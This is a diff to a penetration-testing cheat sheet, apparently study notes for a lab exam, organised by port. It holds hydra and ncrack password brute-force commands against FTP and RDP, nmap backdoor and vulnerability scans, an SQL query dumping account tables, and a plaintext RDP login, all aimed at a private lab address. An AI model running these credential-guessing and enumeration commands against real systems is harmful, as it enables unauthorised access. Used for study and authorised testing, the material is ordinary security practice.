@@ -38,7 +38,7 @@ changeme.py snmp://192.168.200.5
 =================================== 
 # 21 FTP
 nmap -p 21 --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum 192.168.200.5
-hydra -C $ftpbetterdefaultpasslist 192.168.200.5 ftp
+hydra -C $ftpdefaults 192.168.200.5 ftp
 ftp 192.168.200.5  ..anonymous : anonymous@anon.com ..passive (want this on)
 
 # 22 SSH
@@ -141,8 +141,8 @@ show databases; use previse; show tables; select * from accounts;
 
 # 3389 RDP Remote Desktop
 rdesktop -u guest -p guest 192.168.200.5 -g 94%   ..Login to learn OS
-hydra -t 1 -V -f -l users.txt -P $commontenk rdp://192.168.200.5
-ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://192.168.200.5
+hydra -t 1 -V -f -l bob -P $commontenk rdp://192.168.200.5
+ncrack -vv --user Administrator -P $smallpw rdp://192.168.200.5
 xfreerdp /v:192.168.200.5 /d:mike.com /u:bob /p:paxxword -sec-nla +clipboard /geometry /w:1680 /h:900
 
 # 5437 Postgres
@@ -154,4 +154,4 @@ select * from users;
 
 ===================================
 # Consider
-mxweb mxcurls mxsamba
+mxweb mxcurls mxsamba mxbrutes
